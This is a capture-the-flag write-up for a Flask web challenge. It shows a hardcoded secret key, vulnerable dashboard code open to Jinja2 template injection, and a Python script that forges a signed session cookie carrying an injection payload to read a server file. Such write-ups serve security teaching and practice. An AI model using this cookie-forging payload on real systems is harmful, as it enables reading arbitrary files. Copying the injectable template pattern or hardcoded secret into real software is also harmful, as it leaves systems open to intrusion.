# Rose

## Category
Web

## Description
The owner of the site shut down sign ups for some reason, but we've got a backup of the code.

See if you can get access and get /home/ctf/flag.txt

https://nessus-rose.chals.io/

rose.zip

## Solution

- rose.zip contains the source code of the flask application.
- Running it locally and uncommenting the signup functionality allows creating a new user.
- Using this the structure of the session cookie can be seen

A cookie decoded with [flask-unsign](https://github.com/Paradoxis/Flask-Unsign):
```
flask-unsign -d -c .eJwljjkOQjEMRO-SmiJeEtv_MiiLLSig-EuFuDuR6GaKefM-6R67H4-0nfvlt3R_zrSl0gbxRMVBWXSQRhhxBuyl1sxau7FTm5adYuCsEwirUrj1nkObVlQD7xgwpDtby2wmURTWQgWKmmoRWKDwKCLr0AsTKbduaYlch-9_G1j13V6-4unHmb4_Cv8ydw.ZNTgpw.Q16RikWV_IJT8Kiw3FPcm-vzsFg

{'_fresh': True, '_id': '5ac34d282c3078c38ff934012b5660486b94e3ad90e3fc2d6d132683fe9bb0f8a862891eb2f1c7be49a04997f581e3f87158988571b94fef577c34e543384ab9', '_user_id': '1', 'name': 'test'}
```

The secret to sign the session cookies can be found in `__init__.py`:

```python
app.config['SECRET_KEY'] = 'SuperDuperSecureSecretKey1234!'
```

The template for the dashboard (found in `main.py`) is susceptible to jinja2 template injection with the `name` property in the flask session cookie:
```python
@main.route('/dashboard')
@login_required
def dashboard():
    template = '''
{% extends "base.html" %} {% block content %}
<h1 class="title">
    Welcome, '''+ session["name"] +'''!
</h1>
<p> The dashboard feature is currently under construction! </p>
{% endblock %}
'''
    return render_template_string(template)
```

Python code to generate flask session cookie containing payload to read `/home/ctf/flag.txt`:
```python
#!/usr/bin/env python

from os import chdir, popen
from pathlib import Path


def main():
    target_file = "/home/ctf/flag.txt"

    payload = "'{{get_flashed_messages.__globals__.__builtins__.open(\\'"
    payload += target_file
    payload += "\\').read()}}'"

    cookie = "{'_fresh': True, '_id': '5ac34d282c3078c38ff934012b5660486b94e3ad90e3fc2d6d132683fe9bb0f8a862891eb2f1c7be49a04997f581e3f87158988571b94fef577c34e543384ab9', '_user_id': '1','name':"
    cookie += payload
    cookie += "}"

    cmd = 'flask-unsign --sign --cookie "'
    cmd += cookie
    cmd += "\" --secret 'SuperDuperSecureSecretKey1234!'"

    cookie = popen(cmd).read()

    print(cookie)
    print(popen("flask-unsign --decode --cookie " + cookie).read())  # sanity check


if __name__ == "__main__":
    chdir(Path(__file__).parent.resolve())
    main()
```

Settings the resulting cookie and visiting the dashboard returns the contents of `/home/ctf/flag.txt`

```
flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}
```